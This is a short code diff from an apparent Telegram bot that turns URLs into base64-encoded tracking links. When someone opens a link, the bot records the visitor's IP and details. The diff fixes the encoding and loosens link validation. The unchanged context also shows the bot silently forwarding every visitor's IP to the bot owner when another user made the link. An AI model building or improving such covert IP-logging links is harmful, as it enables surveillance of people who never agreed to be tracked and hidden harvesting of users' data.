@@ -138,7 +138,7 @@ async function handleLinkOpen(req, res, view) {
     if (creatorId !== BOT_OWNER) notify(BOT_OWNER, `🔍 IP (ID: ${creatorId}):\n⚓ ${ip}\n${info}`);
   });
 
-  res.render(view, { ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
+  res.render(view, { ip, time: d, url: Buffer.from(req.params.uri, 'base64').toString('utf8'), uid: req.params.path, a: hostURL, t: use1pt });
 }
 
 app.get("/w/:path/:uri",  (req, res) => handleLinkOpen(req, res, "webview"));
@@ -477,9 +477,9 @@ bot.on('polling_error', () => {});
 
 async function createLink(cid, msg) {
   if (!msg || typeof msg !== 'string') return;
-  const encoded = [...msg].some(c => c.charCodeAt(0) > 127);
-  if (msg.toLowerCase().includes('http') && !encoded) {
-    const url = cid.toString(36) + '/' + btoa(msg);
+  const trimmed = msg.trim();
+  if (trimmed.toLowerCase().startsWith('http')) {
+    const url = cid.toString(36) + '/' + Buffer.from(trimmed).toString('base64');
     bot.sendChatAction(cid, "typing");
     stats.linksCreated++; saveStats();
     incUserStat(String(cid), 'linksCreated');
